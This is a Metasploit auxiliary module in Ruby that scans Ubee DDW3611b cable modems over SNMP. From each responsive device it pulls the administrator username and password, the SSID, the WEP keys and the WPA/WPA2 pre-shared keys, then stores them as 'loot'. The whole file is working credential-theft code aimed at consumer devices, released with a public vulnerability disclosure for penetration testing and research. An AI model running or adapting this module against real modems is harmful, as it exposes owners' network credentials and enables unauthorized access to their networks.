##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Ubee DDW3611b Cable Modem Wifi Enumeration',
      'Description' => %q{
        This module will extract WEP keys and WPA preshared keys from
        certain Ubee cable modems.
      },
      'References'  =>
        [
          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2014/05/15/r7-2014-01-r7-2014-02-r7-2014-03-disclosures-exposure-of-critical-information-via-snmp-public-community-string' ]
        ],
      'Author'      => ['Deral "PercentX" Heiland'],
      'License'     => MSF_LICENSE
    )

  end

  def run_host(ip)
      output_data = {}
    begin
      snmp = connect_snmp

      if snmp.get_value('1.2.840.10036.2.1.1.9.12') =~ /DDW3611/
        print_good("#{ip}")
        wifiinfo = ""

        # System user account and Password
        username = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0')
        print_good("Username: #{username}")
        wifiinfo << "Username: #{username}" << "\n"
        password = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0')
        print_good("Password: #{password}")
        wifiinfo << "Password: #{password}" << "\n"

        wifistatus = snmp.get_value('1.3.6.1.2.1.2.2.1.8.12')
        if wifistatus == 1
          ssid = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.1.14.1.3.12')
          print_good("SSID: #{ssid}")
          wifiinfo << "SSID: #{ssid}" << "\n"

          # Wifi Security Version
          wifiversion = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.1.14.1.5.12')
          if wifiversion == "0"
            print_line("Open Access Wifi is Enabled")

          # WEP enabled
          elsif wifiversion == "1"
          weptype = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.2.12')
            if weptype == "2"
              wepkey1 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.1')
              key1 = "#{wepkey1}".unpack('H*')
              print_good("WEP KEY1: #{key1}")
              wifiinfo << "WEP KEY1: #{key1}" << "\n"
              wepkey2 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.2')
              key2 = "#{wepkey2}".unpack('H*')
              print_good("WEP KEY2: #{key2}")
              wifiinfo << "WEP KEY2: #{key2}" << "\n"
              wepkey3 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.3')
              key3 = "#{wepkey3}".unpack('H*')
              print_good("WEP KEY3: #{key3}")
              wifiinfo << "WEP KEY3: #{key3}" << "\n"
              wepkey4 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.4')
              key4 = "#{wepkey4}".unpack('H*')
              print_good("WEP KEY4: #{key4}")
              wifiinfo << "WEP KEY4: #{key4}" << "\n"
              actkey = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.1.12')
              print_good("Active Wep key is #{actkey}")
              wifiinfo << "Active WEP key is KEY#: #{actkey}" << "\n"

            elsif weptype == "1"
              wepkey1 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.2.1.2.12.1')
              key1 = "#{wepkey1}".unpack('H*')
              print_good("WEP KEY1: #{key1}")
              wifiinfo << "WEP KEY1: #{key1}" << "\n"
              wepkey2 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.2.1.2.12.2')
              key2 = "#{wepkey2}".unpack('H*')
              print_good("WEP KEY2: #{key2}")
              wifiinfo << "WEP KEY2: #{key2}" << "\n"
              wepkey3 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.2.1.2.12.3')
              key3 = "#{wepkey3}".unpack('H*')
              print_good("WEP KEY3: #{key3}")
              wifiinfo << "WEP KEY3: #{key3}" << "\n"
              wepkey4 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.2.1.2.12.4')
              key4 = "#{wepkey4}".unpack('H*')
              print_good("WEP KEY4: #{key4}")
              wifiinfo << "WEP KEY4: #{key4}" << "\n"
              actkey = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.1.12')
              print_good("Active Wep key is #{actkey}")
              wifiinfo << "Active WEP key is KEY#: #{actkey}" << "\n"

            else
              print_line("FAILED")
            end

          # WPA enabled
          elsif wifiversion == "2"
            print_line("Device is configured for WPA ")
            wpapsk = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.2.2.1.5.12')
            print_good("WPA PSK: #{wpapsk}")
            wifiinfo << "WPA PSK: #{wpapsk}" << "\n"

          # WPA2 enabled
          elsif wifiversion == "3"
            print_line("Device is configured for WPA2")
            wpapsk2 = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.2.2.1.5.12')
            print_good("WPA2 PSK: #{wpapsk2}")
            wifiinfo << "WPA PSK: #{wpapsk2}" << "\n"

          # WPA Enterprise enabled
          elsif wifiversion == "4"
            print_line("Device is configured for WPA enterprise")

          # WPA2 Enterprise enabled
          elsif wifiversion == "5"
            print_line("Device is configured for WPA2 enterprise")

          # WEP 802.1x enabled
          elsif wifiversion == "6"
            print_line("Device is configured for WEP 802.1X")

          else
            print_line("FAILED")
          end

        else
         print_line("WIFI is not enabled")
         end
    end
     # Woot we got loot.
     loot_name     = "ubee_wifi"
     loot_type     = "text/plain"
     loot_filename = "ubee_wifi.txt"
     loot_desc     = "Ubee Wifi configuration data"
     p = store_loot(loot_name, loot_type, datastore['RHOST'], wifiinfo , loot_filename, loot_desc)
     print_good("WiFi Data saved: #{p}")

     rescue ::SNMP::UnsupportedVersion
     rescue ::SNMP::RequestTimeout
     rescue ::Interrupt
       raise $!
     rescue ::Exception => e
       print_error("#{ip} - Error: #{e.class} #{e}")
     disconnect_snmp
     end
  end
end
